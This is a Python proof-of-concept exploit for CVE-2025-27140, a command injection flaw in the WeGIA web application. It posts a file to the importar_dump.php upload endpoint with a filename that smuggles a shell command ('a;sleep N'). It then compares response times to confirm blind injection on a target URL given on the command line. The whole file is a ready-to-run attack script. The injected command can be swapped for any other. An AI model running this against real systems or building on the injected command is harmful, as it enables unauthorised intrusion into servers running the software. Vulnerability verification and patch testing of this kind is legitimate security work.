#!/usr/bin/env python3
import requests
import sys
import time

def test_sleep(target_url, sleep_seconds):
    upload_url = f"{target_url}/html/configuracao/importar_dump.php"
    payload_filename = f"a;sleep {sleep_seconds}"
    
    files = {
        'import': (payload_filename, b"test", 'application/octet-stream')
    }
    
    try:
        start_time = time.time()
        requests.post(upload_url, files=files, allow_redirects=False, timeout=60)
        elapsed_time = time.time() - start_time
        return elapsed_time
    except Exception as e:
        print(f"[-] Request failed: {e}")
        return None

def exploit(target_url):
    print(f"[*] Target: {target_url}")
    print(f"[*] Testing OS Command Injection via time-based blind method")
    print()
    
    print("[*] Test 1: sleep 1")
    time1 = test_sleep(target_url, 1)
    if time1 is None:
        return False
    print(f"    Response time: {time1:.2f}s")
    
    print("[*] Test 2: sleep 3")
    time2 = test_sleep(target_url, 3)
    if time2 is None:
        return False
    print(f"    Response time: {time2:.2f}s")
    
    print("[*] Test 3: sleep 5")
    time3 = test_sleep(target_url, 5)
    if time3 is None:
        return False
    print(f"    Response time: {time3:.2f}s")
    
    print()
    print("[*] Analysis:")
    diff_1_to_3 = time2 - time1
    diff_3_to_5 = time3 - time2
    print(f"    Difference (sleep 3 - sleep 1): {diff_1_to_3:.2f}s (expected ~2s)")
    print(f"    Difference (sleep 5 - sleep 3): {diff_3_to_5:.2f}s (expected ~2s)")
    
    if diff_1_to_3 >= 1.5 and diff_3_to_5 >= 1.5:
        print()
        print("[+] Response times correlate with sleep durations!")
        print("[+] OS Command Injection CONFIRMED!")
        return True
    else:
        print()
        print("[-] Response times do not correlate with sleep durations")
        return False

def main():
    target_url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
    
    print("=" * 60)
    print("CVE-2025-27140 - WeGIA OS Command Injection PoC")
    print("=" * 60)
    print()
    
    success = exploit(target_url)
    
    print()
    print("=" * 60)
    if success:
        print("[+] Vulnerability confirmed!")
        return 0
    else:
        print("[-] Exploitation failed")
        return 1

if __name__ == "__main__":
    sys.exit(main())
